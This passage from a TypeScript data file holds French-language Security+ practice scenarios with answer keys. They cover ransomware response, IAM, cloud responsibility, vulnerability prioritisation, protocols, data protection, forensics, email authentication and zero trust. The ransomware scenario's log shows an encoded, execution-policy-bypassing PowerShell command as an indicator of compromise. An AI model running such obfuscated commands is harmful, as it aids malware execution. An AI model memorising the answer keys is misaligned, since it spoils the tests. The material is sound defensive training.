          "R8. Logs système — transfert automatique vers une plateforme de monitoring centrale",
        ],
        options: [
          "Lighting",
          "Fencing",
          "Security guard",
          "Access control vestibule",
          "Badge reader",
          "Biometric scanner",
          "Honeyfile",
          "SIEM forwarding",
        ],
        expectedAnswers: [
          "Lighting",
          "Fencing",
          "Security guard",
          "Access control vestibule",
          "Badge reader",
          "Biometric scanner",
          "Honeyfile",
          "SIEM forwarding",
        ],
        explanation: `Lighting : contrôle deterrent nocturne — décourage sans bloquer physiquement.
Fencing : délimite et protège le périmètre physique extérieur.
Security guard : présence humaine (operational) pour vérifier l'identité à la réception.
Access control vestibule (sas) : une seule personne entre à la fois → empêche le tailgating.
Badge reader : accès par carte pour les portes employés.
Biometric scanner : vérification d'une caractéristique humaine unique (something you are).
Honeyfile : fichier leurre qui déclenche une alerte si quelqu'un y accède.
SIEM forwarding : collecte et centralise automatiquement les logs pour monitoring.`,
        traps: [
          "Security guard = operational (humain qui agit), pas seulement physical.",
          "Access badge seul ≠ anti-tailgating : deux personnes peuvent entrer avec un seul badge.",
          "Honeyfile ≠ Honeypot : honeyfile = fichier leurre ; honeypot = système leurre complet.",
          "Lighting = deterrent principalement, pas detective (ne détecte pas directement).",
        ],
        points: 80,
      },
    ],
  } satisfies ScenarioTasksPBQ,

  // PBQ2-4. Incident Response: Ransomware Timeline
  {
    id: "pbq2-ransomware-004",
    domain: "4.8 Activités de réponse aux incidents · 4.9 Sources de données forensiques",
    type: "scenario_tasks",
    title: "Réponse à un ransomware — Timeline multi-tâche",
    difficulty: "advanced",
    timeLimitSeconds: 480,
    role: "Incident Responder",
    scenario: `Des utilisateurs signalent que des fichiers sur un partage réseau sont renommés avec l'extension .locked.

Événements observés :
09:14  HR-WS-22   user=agarcia a ouvert la pièce jointe payroll_update.xlsm
09:15  HR-WS-22   powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA
09:16  HR-WS-22   connexion sortante vers 198.51.100.77:443
09:17  FS-01      écritures SMB depuis HR-WS-22 augmentées de 900 %
09:18  FS-01      fichiers renommés *.docx -> *.locked
09:19  FS-01      tentative d'accès au partage backup échouée
09:20  SIEM       alerte : PowerShell suspect + modification massive de fichiers`,
    objective: "Identifier l'attaque, ordonner les actions IR, sélectionner les IOCs et choisir la mitigation long terme.",
    source: "PBQ2",
    skills: ["Incident Response", "Forensics", "Ransomware", "Domaines 4.8 et 4.9 SY0-701"],
    scoring: {
      max: 100,
      rules: [
        { condition: "Attaque identifiée correctement", points: 20 },
        { condition: "Ordre IR correct", points: 30 },
        { condition: "Trois IOCs corrects", points: 30 },
        { condition: "Mitigation long terme correcte", points: 20 },
      ],
      penalties: [],
    },
    tasks: [
      {
        id: "t-rw-001",
        kind: "single_choice",
        title: "Tâche 1 — Identifier l'attaque la plus probable",
        prompt: "Sélectionnez le type d'attaque le plus probable selon les événements observés.",
        options: ["Ransomware", "SQL injection", "DNS poisoning", "Credential stuffing"],
        expectedAnswers: ["Ransomware"],
        explanation: `Les indicateurs clés : pièce jointe malveillante ouverte → exécution de PowerShell obfusqué → connexion C2 sortante → chiffrement massif de fichiers (*.locked). Ce profil correspond précisément à un ransomware.`,
        traps: [
          "Credential stuffing = tentatives de connexion avec des identifiants volés, pas de chiffrement de fichiers.",
          "DNS poisoning = manipulation du DNS, aucun lien avec le chiffrement de fichiers.",
        ],
        points: 20,
      },
      {
        id: "t-rw-002",
        kind: "ordering",
        title: "Tâche 2 — Ordonner les actions de réponse à l'incident",
        prompt: "Placez les actions dans le bon ordre chronologique de réponse à l'incident. Utilisez les flèches ↑↓.",
        items: [
          "Confirm detection and declare incident",
          "Analyze logs and determine scope",
          "Isolate HR-WS-22 from the network",
          "Eradicate malware and persistence",
          "Recover from verified offline backups",
          "Conduct lessons learned",
        ],
        expectedAnswers: [
          "Confirm detection and declare incident",
          "Analyze logs and determine scope",
          "Isolate HR-WS-22 from the network",
          "Eradicate malware and persistence",
          "Recover from verified offline backups",
          "Conduct lessons learned",
        ],
        explanation: `1. Confirmer et déclarer : valider que c'est bien un incident avant d'agir à grande échelle.
2. Analyser et déterminer la portée : quels systèmes sont touchés, quelle est la timeline.
3. Isoler HR-WS-22 : containment pour empêcher la propagation latérale.
4. Éradiquer le malware : supprimer le ransomware et les mécanismes de persistance.
5. Récupérer depuis des sauvegardes hors ligne vérifiées : restaurer depuis une source saine.
6. Lessons learned : retour d'expérience et mise à jour des procédures.`,
        traps: [
          "Recovery avant Eradication = restaurer dans un environnement encore compromis.",
          "Reboot du poste en premier = détruit les preuves volatiles en RAM.",
          "Supprimer les fichiers chiffrés = perte de données sans récupération possible.",
        ],
        points: 30,
      },
      {
        id: "t-rw-003",
        kind: "multi_select",
        title: "Tâche 3 — Sélectionner les 3 meilleurs indicateurs de compromission (IOCs)",
        prompt: "Sélectionnez exactement les 3 indicateurs de compromission les plus significatifs parmi les suivants.",
        options: [
          "PowerShell EncodedCommand",
          "Mass file rename to .locked",
          "SMB write spike",
          "Normal HTTPS traffic to Microsoft update",
          "Successful user login during business hours",
          "Backup share access attempt",
        ],
        expectedAnswers: [
          "PowerShell EncodedCommand",
          "Mass file rename to .locked",
          "SMB write spike",
        ],
        explanation: `PowerShell EncodedCommand : technique d'obfuscation classique des ransomwares pour masquer la commande.
Mass file rename to .locked : signature directe du chiffrement ransomware.
SMB write spike (+900%) : propagation latérale du ransomware sur le partage réseau.

Normal HTTPS to Microsoft = trafic légitime.
User login during business hours = comportement normal.
Backup share access attempt failed = suspect mais ambigu (tentative échouée).`,
        traps: [
          "Backup share access attempt : tentative échouée — suspect mais moins précis comme IOC direct du ransomware.",
          "Login réussi pendant les heures ouvrées = comportement normal, pas un IOC.",
          "HTTPS vers Microsoft Update = trafic légitime.",
        ],
        points: 30,
      },
      {
        id: "t-rw-004",
        kind: "single_choice",
        title: "Tâche 4 — Choisir la meilleure mitigation long terme",
        prompt: "Sélectionnez la meilleure stratégie de mitigation long terme contre les ransomwares.",
        options: [
          "Désactiver toutes les messageries électroniques",
          "Use immutable offline backups and EDR containment",
          "Autoriser les macros pour toutes les feuilles Excel des RH",
          "Déplacer le serveur de fichiers en DMZ",
        ],
        expectedAnswers: ["Use immutable offline backups and EDR containment"],
        explanation: `Les sauvegardes immuables hors ligne (air-gapped) garantissent la restauration même si les sauvegardes en ligne sont chiffrées. L'EDR (Endpoint Detection & Response) permet la containment rapide et la visibilité des comportements suspects.`,
        traps: [
          "Désactiver les emails = trop impactant opérationnellement, n'élimine pas tous les vecteurs.",
          "Autoriser les macros = aggrave le risque (les macros sont un vecteur d'infection classique).",
          "File server en DMZ = expose davantage les données aux attaquants externes.",
        ],
        points: 20,
      },
    ],
  } satisfies ScenarioTasksPBQ,

  // PBQ2-5. IAM / Federation / Access Control
  {
    id: "pbq2-iam-005",
    domain: "4.6 Identité et gestion des accès · 1.2 Modèles d'autorisation",
    type: "scenario_tasks",
    title: "IAM : associer exigences et solutions d'accès",
    difficulty: "intermediate",
    timeLimitSeconds: 360,
    role: "Identity Administrator",
    scenario: "Vous implémentez des contrôles d'accès pour une entreprise utilisant des applications cloud. Associez chaque exigence à la meilleure solution. Toutes les solutions ne seront pas utilisées.",
    objective: "Choisir la bonne solution IAM (SSO, OAuth, ABAC, DAC, JIT PAM, deprovisioning) selon le besoin.",
    source: "PBQ2",
    skills: ["SSO", "OAuth", "ABAC", "DAC", "PAM", "Deprovisioning", "Domaine 4.6 SY0-701"],
    scoring: {
      max: 60,
      rules: [{ condition: "Chaque association correcte", points: 10 }],
      penalties: [],
    },
    tasks: [
      {
        id: "t-iam-001",
        kind: "matching",
        title: "Exigence IAM → Meilleure solution",
        prompt: "Associez chaque exigence à la meilleure solution. Toutes les solutions ne seront pas utilisées.",
        items: [
          "R1. Les utilisateurs accèdent à plusieurs applications cloud après une seule connexion.",
          "R2. Une app tierce accède au calendrier d'un utilisateur sans recevoir son mot de passe.",
          "R3. L'accès à la paie dépend du département, de la conformité de l'appareil, du lieu et de l'heure.",
          "R4. Les propriétaires de fichiers peuvent accorder l'accès en lecture à leurs propres projets.",
          "R5. Les anciens employés doivent immédiatement perdre tout accès à tous les systèmes.",
          "R6. Les privilèges admin doivent être accordés temporairement uniquement en cas de besoin.",
        ],
        options: [
          "SSO",
          "OAuth",
          "ABAC",
          "DAC",
          "Deprovisioning",
          "Just-in-time PAM",
          "MAC",
          "PSK",
          "Kerberos only",
        ],
        expectedAnswers: [
          "SSO",
          "OAuth",
          "ABAC",
          "DAC",
          "Deprovisioning",
          "Just-in-time PAM",
        ],
        explanation: `SSO (Single Sign-On) : une authentification unique donne accès à plusieurs applications.
OAuth : délégation d'autorisation sans partage de mot de passe (ex. "Sign in with Google").
ABAC : contrôle basé sur des attributs dynamiques (département, appareil, lieu, heure).
DAC (Discretionary Access Control) : le propriétaire de la ressource contrôle les permissions.
Deprovisioning : suppression immédiate des comptes et accès lors du départ d'un employé.
Just-in-time PAM : privilèges admin accordés temporairement à la demande puis révoqués.`,
        traps: [
          "OAuth ≠ authentification : OAuth gère l'autorisation ; OIDC ajoute l'authentification sur OAuth.",
          "RBAC vs ABAC : ici plusieurs attributs dynamiques (lieu, heure, appareil) → ABAC.",
          "Offboarding vs Deprovisioning : offboarding = processus RH global ; deprovisioning = retrait des accès IT.",
          "PAM vs MFA : MFA vérifie l'identité ; PAM gère les privilèges administrateur.",
        ],
        points: 60,
      },
    ],
  } satisfies ScenarioTasksPBQ,

  // PBQ2-6. Cloud Shared Responsibility + Misconfiguration
  {
    id: "pbq2-cloud-006",
    domain: "3.1 Modèles d'architecture · 4.1 Sécurité cloud · 5.2 Gestion des risques",
    type: "scenario_tasks",
    title: "Cloud : responsabilité partagée et misconfiguration",
    difficulty: "intermediate",
    timeLimitSeconds: 420,
    role: "Cloud Security Analyst",
    scenario: "Vous examinez un déploiement cloud public. L'entreprise utilise : SaaS email, IaaS VMs, stockage objet cloud, base de données managée. Un audit a révélé qu'un bucket de stockage objet contenant des factures clients est accessible publiquement en lecture.",
    objective: "Classer les responsabilités cloud (Customer/Provider/Shared) et choisir les bonnes actions de remédiation.",
    source: "PBQ2",
    skills: ["Modèle de responsabilité partagée", "Cloud misconfiguration", "Domaines 3.1 et 4.1 SY0-701"],
    scoring: {
      max: 100,
      rules: [
        { condition: "Classifications correctes", points: 50 },
        { condition: "Première action correcte", points: 25 },
        { condition: "Type de vulnérabilité correct", points: 25 },
      ],
      penalties: [],
    },
    tasks: [
      {
        id: "t-cloud-001",
        kind: "classification",
        title: "Tâche 1 — Classer les responsabilités (Customer / Provider / Shared)",
        prompt: "Pour chaque élément, indiquez si la responsabilité incombe au Customer, au Provider cloud, ou si elle est Shared.",
        items: [
          "Physical datacenter security",
          "SaaS email application patching",
          "IaaS guest OS patching",
          "Customer data classification",
          "Object storage access policy",
          "Hypervisor maintenance",
          "Identity and access configuration",
        ],
        options: ["Customer", "Provider", "Shared"],
        expectedAnswers: [
          "Provider",
          "Provider",
          "Customer",
          "Customer",
          "Customer",
          "Provider",
          "Shared",
        ],
        explanation: `Provider : datacenter physique, patches de l'appli SaaS (le fournisseur gère la couche applicative), maintenance de l'hyperviseur.
Customer : patches de l'OS guest IaaS (le client gère sa VM), classification des données, politique d'accès au stockage objet (bucket policy).
Shared : IAM — le provider offre les outils, le client configure les accès.`,
        traps: [
          "SaaS : le provider gère tout jusqu'à l'application — le client gère seulement ses données et ses accès.",
          "IaaS OS patching : contrairement au SaaS, le client est responsable de son OS dans une VM IaaS.",
          "Bucket policy = responsabilité Customer : la misconfiguration du bucket est une erreur de configuration du client.",
        ],
        points: 50,
      },
      {
        id: "t-cloud-002",
        kind: "single_choice",
        title: "Tâche 2 — Choisir la PREMIÈRE action à effectuer",
        prompt: "Un bucket de stockage objet contenant des factures clients est publiquement accessible en lecture. Quelle est la PREMIÈRE action à prendre ?",
        options: [
          "Supprimer le bucket immédiatement",
          "Disable public access and review access logs",
          "Déplacer toutes les données vers une sauvegarde sur bande",
          "Modifier les enregistrements DNS publics de l'entreprise",
        ],
        expectedAnswers: ["Disable public access and review access logs"],
        explanation: `La première action est de couper l'exposition (désactiver l'accès public) et d'analyser les logs pour savoir si des données ont été exfiltrées. Supprimer le bucket détruirait les preuves. Modifier le DNS est hors sujet.`,
        traps: [
          "Supprimer le bucket en premier = destruction de preuves potentielles.",
          "Déplacer vers bande = lent et ne coupe pas l'exposition immédiate.",
          "DNS = hors sujet pour une misconfiguration de bucket.",
        ],
        points: 25,
      },
      {
        id: "t-cloud-003",
        kind: "single_choice",
        title: "Tâche 3 — Identifier le type de vulnérabilité",
        prompt: "Quel type de vulnérabilité explique le bucket publiquement accessible ?",
        options: [
          "Cloud misconfiguration",
          "Race condition",
          "Buffer overflow",
          "End-of-life system",
        ],
        expectedAnswers: ["Cloud misconfiguration"],
        explanation: `Un bucket cloud accessible publiquement par erreur de configuration (bucket policy trop permissive, ACL mal définie) est une cloud misconfiguration — l'un des vecteurs d'incident cloud les plus fréquents.`,
        traps: [
          "Buffer overflow = vulnérabilité mémoire, pas une misconfiguration cloud.",
          "End-of-life = système non supporté, hors sujet ici.",
          "Race condition = problème de concurrence dans le code, pas de config cloud.",
        ],
        points: 25,
      },
    ],
  } satisfies ScenarioTasksPBQ,

  // PBQ2-7. Vulnerability Management Prioritization
  {
    id: "pbq2-vulnmgmt-007",
    domain: "4.3 Gestion des vulnérabilités · 5.2 Gestion des risques",
    type: "scenario_tasks",
    title: "Prioriser la remédiation des vulnérabilités",
    difficulty: "advanced",
    timeLimitSeconds: 360,
    role: "Vulnerability Management Analyst",
    scenario: "La fenêtre de patch est limitée à deux heures. Priorisez la remédiation du risque le plus élevé au plus faible. La décision ne doit pas se baser uniquement sur le score CVSS.",
    objective: "Classer les vulnérabilités par priorité réelle en tenant compte de l'exposition, la criticité, l'exploitabilité et la sensibilité des données.",
    source: "PBQ2",
    skills: ["Vulnerability prioritization", "CVSS", "Risk-based analysis", "Domaine 4.3 SY0-701"],
    scoring: {
      max: 100,
      rules: [
        { condition: "Rang 1 correct", points: 30 },
        { condition: "Rang 2 correct", points: 25 },
        { condition: "Rang 3 correct", points: 20 },
        { condition: "Rang 4 correct", points: 15 },
        { condition: "Rang 5 correct", points: 10 },
      ],
      penalties: [],
    },
    tasks: [
      {
        id: "t-vuln-001",
        kind: "ordering",
        title: "Classer les actifs du risque le plus élevé au plus faible",
        prompt: "Utilisez les flèches ↑↓ pour ordonner du risque le PLUS élevé (rang 1) au PLUS faible (rang 5). Ne classez pas uniquement par CVSS.",
        items: [
          "A. Public VPN gateway — CVSS 8.1 | Internet-facing | High criticality | Exploit: Yes | Data: Medium",
          "B. Internal workstation — CVSS 9.8 | Internal only | Low criticality | Exploit: Yes | Data: Low",
          "C. Domain controller — CVSS 7.5 | Internal only | Critical | Exploit: No | Data: High",
          "D. Public marketing website — CVSS 6.8 | Internet-facing | Medium | Exploit: No | Data: Public",
          "E. Database server — CVSS 6.4 | Internal only | Critical | Exploit: Yes | Data: High",
        ],
        expectedAnswers: [
          "A. Public VPN gateway — CVSS 8.1 | Internet-facing | High criticality | Exploit: Yes | Data: Medium",
          "E. Database server — CVSS 6.4 | Internal only | Critical | Exploit: Yes | Data: High",
          "C. Domain controller — CVSS 7.5 | Internal only | Critical | Exploit: No | Data: High",
          "B. Internal workstation — CVSS 9.8 | Internal only | Low criticality | Exploit: Yes | Data: Low",
          "D. Public marketing website — CVSS 6.8 | Internet-facing | Medium | Exploit: No | Data: Public",
        ],
        explanation: `A (VPN) — Rang 1 : exposition Internet + exploit disponible + criticité haute = risque maximal d'intrusion réseau.
E (Database) — Rang 2 : criticité critique + exploit disponible + données sensibles, malgré CVSS plus faible.
C (DC) — Rang 3 : criticité critique + données très sensibles, mais pas d'exploit connu.
B (Workstation) — Rang 4 : CVSS très élevé (9.8) mais exposition et criticité faibles.
D (Marketing) — Rang 5 : données publiques, CVSS faible, pas d'exploit connu.`,
        traps: [
          "Ne pas classer uniquement par CVSS : B (CVSS 9.8) est seulement en rang 4 car criticité et exposition sont faibles.",
          "Exposition Internet aggrave le risque : A et D sont Internet-facing, mais les données de D sont publiques.",
          "Exploit disponible = facteur critique : A et E ont des exploits disponibles, ce qui les priorise.",
        ],
        points: 100,
      },
    ],
  } satisfies ScenarioTasksPBQ,

  // PBQ2-8. Secure Protocol Replacement
  {
    id: "pbq2-protocols-008",
    domain: "4.5 Protocoles sécurisés · 3.2 Communication sécurisée",
    type: "scenario_tasks",
    title: "Remplacer les protocoles non sécurisés",
    difficulty: "foundation",
    timeLimitSeconds: 300,
    role: "Network Security Engineer",
    scenario: "Un audit a révélé que des protocoles non sécurisés sont encore utilisés. Associez chaque protocole non sécurisé à son meilleur remplacement, puis identifiez ceux à bloquer en priorité au périmètre.",
    objective: "Connaître les remplacements sécurisés de chaque protocole legacy et identifier les priorités de blocage périmétrique.",
    source: "PBQ2",
    skills: ["Secure protocols", "Telnet", "FTP", "LDAP", "SNMP", "Domaine 4.5 SY0-701"],
    scoring: {
      max: 100,
      rules: [
        { condition: "Chaque remplacement correct", points: 10 },
        { condition: "Deux protocoles périmètre corrects", points: 20 },
      ],
      penalties: [],
    },
    tasks: [
      {
        id: "t-proto-001",
        kind: "matching",
        title: "Protocole non sécurisé → Meilleur remplacement sécurisé",
        prompt: "Associez chaque protocole non sécurisé à son meilleur remplacement.",
        items: ["Telnet", "FTP", "HTTP", "LDAP", "SNMPv2", "POP3", "IMAP", "Syslog UDP"],
        options: [
          "SSH",
          "SFTP",
          "HTTPS",
          "LDAPS",
          "SNMPv3",
          "POP3S",
          "IMAPS",
          "Syslog over TLS",
        ],
        expectedAnswers: [
          "SSH",
          "SFTP",
          "HTTPS",
          "LDAPS",
          "SNMPv3",
          "POP3S",
          "IMAPS",
          "Syslog over TLS",
        ],
        explanation: `Telnet → SSH : terminal chiffré.
FTP → SFTP : transfert de fichiers via SSH (pas FTPS qui utilise TLS).
HTTP → HTTPS : web chiffré via TLS.
LDAP → LDAPS : interrogation d'annuaire chiffrée (port 636).
SNMPv2 → SNMPv3 : ajoute authentification et chiffrement.
POP3 → POP3S : messagerie chiffrée via TLS.
IMAP → IMAPS : messagerie IMAP chiffrée.
Syslog UDP → Syslog over TLS : logs chiffrés et fiables.`,
        traps: [
          "SFTP ≠ FTPS : SFTP utilise SSH (port 22) ; FTPS utilise TLS (ports 990/21).",
          "LDAP vs Kerberos : LDAP interroge l'annuaire ; Kerberos authentifie par tickets.",
          "SNMPv3 : ajoute authentification + chiffrement par rapport à SNMPv1/v2.",
          "Syslog UDP : souvent non chiffré et non fiable (UDP = pas de garantie de livraison).",
        ],
        points: 80,
      },
      {
        id: "t-proto-002",
        kind: "multi_select",
        title: "Sélectionner les 2 protocoles à bloquer en priorité au périmètre",
        prompt: "Parmi les protocoles non sécurisés ci-dessous, sélectionnez les DEUX qui doivent être bloqués en priorité au pare-feu périmétrique.",
        options: ["Telnet", "FTP", "HTTP", "LDAP", "SNMPv2", "POP3", "IMAP", "Syslog UDP"],
        expectedAnswers: ["Telnet", "FTP"],
        explanation: `Telnet et FTP sont les protocoles les plus dangereux en périmètre car :
- Telnet expose des sessions d'administration non chiffrées en clair.
- FTP expose les identifiants et données en clair, avec des ports actifs/passifs difficiles à contrôler.
Ces deux protocoles n'ont aucune justification d'usage légitime vers l'Internet depuis un périmètre sécurisé.`,
        traps: [
          "HTTP : souvent encore nécessaire pour les redirections, pas prioritaire à bloquer en premier.",
          "LDAP : trafic interne généralement, peu présent au périmètre Internet.",
          "SNMPv2 : dangereux mais trafic principalement interne.",
        ],
        points: 20,
      },
    ],
  } satisfies ScenarioTasksPBQ,

  // PBQ2-9. Data Protection / Classification / Encryption Level
  {
    id: "pbq2-dataprotect-009",
    domain: "3.3 Protection des données · 1.4 Solutions cryptographiques",
    type: "scenario_tasks",
    title: "Classification des données et méthode de protection",
    difficulty: "intermediate",
    timeLimitSeconds: 420,
    role: "Data Security Analyst",
    scenario: "Vous analysez plusieurs types de données traitées par l'entreprise. Pour chacune, déterminez la classification appropriée et la meilleure méthode de protection.",
    objective: "Associer la classification de données correcte et la méthode de protection optimale à chaque type de donnée.",
    source: "PBQ2",
    skills: ["Data classification", "Tokenization", "Data masking", "FDE", "Domaine 3.3 SY0-701"],
    scoring: {
      max: 100,
      rules: [
        { condition: "Chaque classification correcte", points: 8 },
        { condition: "Chaque protection correcte", points: 9 },
      ],
      penalties: [],
    },
    tasks: [
      {
        id: "t-data-001",
        kind: "matching",
        title: "Tâche 1 — Donnée → Classification",
        prompt: "Associez chaque donnée à sa classification de confidentialité appropriée.",
        items: [
          "D1. Brochure produit disponible sur le site public",
          "D2. Numéros d'assurance sociale des employés",
          "D3. Code source d'une application de paiement propriétaire",
          "D4. Numéros de carte de crédit clients stockés pour la facturation récurrente",
          "D5. Laptop d'un cadre dirigeant utilisé en déplacement",
          "D6. Base de données de test avec structure réaliste mais sans vraies identités",
        ],
        options: ["Public", "Internal", "Confidential", "Restricted"],
        expectedAnswers: [
          "Public",
          "Restricted",
          "Confidential",
          "Restricted",
          "Restricted",
          "Internal",
        ],
        explanation: `Public : brochure accessible à tous, aucune restriction.
Restricted : NAS employés et numéros de carte = données réglementées (PIPEDA, PCI DSS).
Confidential : code source propriétaire = avantage concurrentiel, accès limité aux équipes internes autorisées.
Restricted : données de carte = conformité PCI DSS obligatoire.
Restricted : laptop exécutif = contient potentiellement des données hautement sensibles.
Internal : base de test sans vraies données = usage interne, non classifié Restricted.`,
        traps: [
          "Laptop cadre = Restricted (pas seulement Confidential) car il peut contenir des données stratégiques.",
          "DB de test = Internal (pas Restricted) si elle ne contient pas de vraies données personnelles.",
          "Code source = Confidential (pas Restricted) — c'est un actif intellectuel, pas une donnée réglementée.",
        ],
        points: 48,
      },
      {
        id: "t-data-002",
        kind: "matching",
        title: "Tâche 2 — Donnée → Méthode de protection",
        prompt: "Associez chaque donnée à la meilleure méthode de protection.",
        items: [
          "D1. Brochure produit disponible sur le site public",
          "D2. Numéros d'assurance sociale des employés",
          "D3. Code source d'une application de paiement propriétaire",
          "D4. Numéros de carte de crédit clients stockés pour la facturation récurrente",
          "D5. Laptop d'un cadre dirigeant utilisé en déplacement",
          "D6. Base de données de test avec structure réaliste mais sans vraies identités",
        ],
        options: [
          "No encryption required",
          "File-level encryption",
          "Access control only",
          "Tokenization",
          "Full-disk encryption",
          "Data masking",
        ],
        expectedAnswers: [
          "No encryption required",
          "File-level encryption",
          "Access control only",
          "Tokenization",
          "Full-disk encryption",
          "Data masking",
        ],
        explanation: `D1 (brochure publique) : aucun chiffrement requis — donnée publique par définition.
D2 (NAS) : chiffrement au niveau fichier/base de données pour protéger les données sensibles au repos.
D3 (code source) : access control only — le code ne nécessite pas de chiffrement si les ACL sont correctes.
D4 (cartes) : tokenization — remplace le PAN par un token, exigence PCI DSS pour la facturation récurrente.
D5 (laptop exécutif) : full-disk encryption (FDE) — protection contre la perte ou le vol en déplacement.
D6 (DB test) : data masking — conserve la structure réaliste sans exposer de vraies données.`,
        traps: [
          "Tokenization pour brochure publique = inutile et coûteux.",
          "FDE seul pour DB = protège le disque mais pas l'usage applicatif des données.",
          "Data masking vs Encryption : masking garde le format utilisable sans révéler les vraies données.",
          "Tokenization est la solution PCI DSS privilégiée pour stocker les numéros de carte.",
        ],
        points: 54,
      },
    ],
  } satisfies ScenarioTasksPBQ,

  // PBQ2-10. Order of Volatility / Digital Forensics
  {
    id: "pbq2-volatility-010",
    domain: "4.8 Forensics numérique · 4.9 Sources de données",
    type: "scenario_tasks",
    title: "Ordre de collecte forensique (volatilité)",
    difficulty: "foundation",
    timeLimitSeconds: 300,
    role: "Digital Forensics Analyst",
    scenario: "Vous enquêtez sur un poste de travail compromis encore sous tension. Ordonnez les sources de preuves de la plus volatile à la moins volatile pour préserver un maximum d'éléments.",
    objective: "Connaître l'ordre de volatilité des preuves numériques selon les bonnes pratiques forensiques.",
    source: "PBQ2",
    skills: ["Order of volatility", "Digital forensics", "Domaine 4.8 SY0-701"],
    scoring: {
      max: 80,
      rules: [{ condition: "Chaque source en position correcte", points: 10 }],
      penalties: [],
    },
    tasks: [
      {
        id: "t-vol-001",
        kind: "ordering",
        title: "Classer les sources de preuve du plus volatile au moins volatile",
        prompt: "Utilisez les flèches ↑↓ pour ordonner du plus volatile (disparaît le plus vite) au moins volatile.",
        items: [
          "CPU cache",
          "RAM",
          "Network connections",
          "Running processes",
          "Temporary files",
          "Disk image",
          "Archived backups",
          "Printed documentation",
        ],
        expectedAnswers: [
          "CPU cache",
          "RAM",
          "Network connections",
          "Running processes",
          "Temporary files",
          "Disk image",
          "Archived backups",
          "Printed documentation",
        ],
        explanation: `CPU cache : données en registres/cache processeur, disparaissent à chaque cycle ou à l'arrêt.
RAM : mémoire volatile — sessions, clés de chiffrement, connexions actives.
Network connections : sessions TCP/IP actives, état du pare-feu en temps réel.
Running processes : liste des processus actifs, arguments, handles ouverts.
Temporary files : fichiers temporaires OS, swap, pagefile — effacés au redémarrage.
Disk image : données persistantes sur le disque dur ou SSD.
Archived backups : sauvegardes hors ligne, les moins susceptibles de changer.
Printed documentation : support physique, le moins volatile de tous.`,
        traps: [
          "Disk image en premier = mauvaise pratique ; le disque est moins volatile que la RAM.",
          "Reboot avant collecte = détruit RAM, connexions réseau et processus.",
          "Logs papier avant RAM = mauvaise priorité forensique.",
        ],
        points: 80,
      },
    ],
  } satisfies ScenarioTasksPBQ,

  // PBQ2-11. Email Security: SPF / DKIM / DMARC
  {
    id: "pbq2-email-011",
    domain: "4.5 Sécurité email · 2.2 Vecteurs de menaces par message",
    type: "scenario_tasks",
    title: "SPF, DKIM, DMARC — Sécurité email anti-spoofing",
    difficulty: "intermediate",
    timeLimitSeconds: 300,
    role: "Email Security Administrator",
    scenario: "L'organisation veut réduire le spoofing et le phishing. Associez chaque technologie à sa fonction, puis choisissez la bonne politique DMARC.",
    objective: "Distinguer SPF, DKIM, DMARC et MX, et choisir la politique DMARC selon l'objectif de sécurité.",
    source: "PBQ2",
    skills: ["SPF", "DKIM", "DMARC", "Anti-spoofing", "Domaine 4.5 SY0-701"],
    scoring: {
      max: 60,
      rules: [
        { condition: "Chaque technologie → fonction correcte", points: 10 },
        { condition: "Politique DMARC correcte", points: 20 },
      ],
      penalties: [],
    },
    tasks: [
      {
        id: "t-email-001",
        kind: "matching",
        title: "Tâche 1 — Technologie email → Fonction",
        prompt: "Associez chaque technologie à sa fonction dans la sécurité email.",
        items: ["SPF", "DKIM", "DMARC", "MX"],
        options: [
          "Lists authorized sending servers",
          "Digitally signs outbound mail",
          "Defines policy when SPF/DKIM fail",
          "Identifies mail servers for a domain",
        ],
        expectedAnswers: [
          "Lists authorized sending servers",
          "Digitally signs outbound mail",
          "Defines policy when SPF/DKIM fail",
          "Identifies mail servers for a domain",
        ],
        explanation: `SPF (Sender Policy Framework) : enregistrement DNS TXT listant les serveurs autorisés à envoyer au nom du domaine.
DKIM (DomainKeys Identified Mail) : signe cryptographiquement les emails sortants avec une clé privée ; le destinataire vérifie avec la clé publique DNS.
DMARC : politique qui définit ce qui doit se passer si SPF et/ou DKIM échouent (none, quarantine, reject).
MX (Mail eXchange) : enregistrement DNS qui indique les serveurs de messagerie du domaine (routage entrant).`,
        traps: [
          "SPF vs DKIM : SPF vérifie le serveur d'envoi ; DKIM vérifie la signature du message.",
          "DMARC p=none : surveillance seulement, aucun rejet.",
          "MX ≠ anti-spoofing : MX sert au routage entrant, pas à la protection contre le spoofing.",
        ],
        points: 40,
      },
      {
        id: "t-email-002",
        kind: "single_choice",
        title: "Tâche 2 — Choisir la bonne politique DMARC",
        prompt: "L'organisation veut que les emails qui échouent à SPF/DKIM soient rejetés (pas mis en spam). Quelle politique DMARC choisir ?",
        options: ["p=none", "p=quarantine", "p=reject"],
        expectedAnswers: ["p=reject"],
        explanation: `p=none : surveillance uniquement, les emails non conformes sont quand même livrés.
p=quarantine : les emails non conformes sont mis en spam/quarantaine.
p=reject : les emails non conformes sont rejetés définitivement — objectif ici.`,
        traps: [
          "p=none = pas de protection réelle, seulement des rapports.",
          "p=quarantine = spam/quarantaine, pas un rejet total.",
          "Toujours commencer par p=none pour monitorer, puis passer à quarantine puis reject en production.",
        ],
        points: 20,
      },
    ],
  } satisfies ScenarioTasksPBQ,

  // PBQ2-12. Zero Trust Access Decision
  {
    id: "pbq2-zerotrust-012",
    domain: "1.2 Zero Trust · 4.6 IAM",
    type: "scenario_tasks",
    title: "Zero Trust — Décision d'accès contextuelle",
    difficulty: "advanced",
    timeLimitSeconds: 360,
    role: "Zero Trust Architect",
    scenario: `Politique d'accès à l'application Finance :
• Utilisateur dans le groupe Finance
• Appareil conforme (compliant)
• MFA réussi
• Localisation approuvée OU vérification step-up si localisation nouvelle
• Score de risque ≤ Medium`,
    objective: "Appliquer le modèle Zero Trust pour prendre des décisions d'accès (Allow / Step-up / Deny) selon le contexte.",
    source: "PBQ2",
    skills: ["Zero Trust", "Adaptive authentication", "Conditional access", "Domaine 1.2 SY0-701"],
    scoring: {
      max: 60,
      rules: [{ condition: "Chaque décision correcte", points: 10 }],
      penalties: [],
    },
    tasks: [
      {
        id: "t-zt-001",
        kind: "classification",
        title: "Évaluer chaque demande d'accès : Allow / Step-up authentication / Deny",
        prompt: "Pour chaque demande, appliquez la politique Zero Trust et choisissez la décision correcte.",
        items: [
          "R1: Groupe Finance | Appareil conforme | MFA: réussi | Localisation: approuvée | Risque: Low",
          "R2: Groupe Finance | Appareil NON conforme | MFA: réussi | Localisation: approuvée | Risque: Low",
          "R3: Groupe Finance | Appareil conforme | MFA: réussi | Localisation: NOUVEAU pays | Risque: Medium",
